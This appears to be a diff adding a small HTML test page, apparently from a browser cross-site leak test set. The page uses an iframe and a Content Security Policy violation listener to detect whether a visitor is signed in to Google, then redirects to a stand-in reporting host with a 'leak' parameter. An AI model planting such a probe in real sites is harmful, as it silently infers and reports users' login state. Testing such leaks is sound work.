@@ -1,0 +1,10 @@
+<iframe id="redirectionFrame" src="https://leak.test/GenAI-38-Examples-4o-Latest/c932892/helper"></iframe>
+
+<script>
+  document.addEventListener("securitypolicyviolation", function (e) {
+    console.log("Blocked URI: " + e.blockedURI);
+    if (e.blockedURI.includes("googleusercontent.com") || e.blockedURI.includes("accounts.google.com")) {
+      document.location.href = "https://a.test/report/?leak=c932892";
+    }
+  });
+</script>
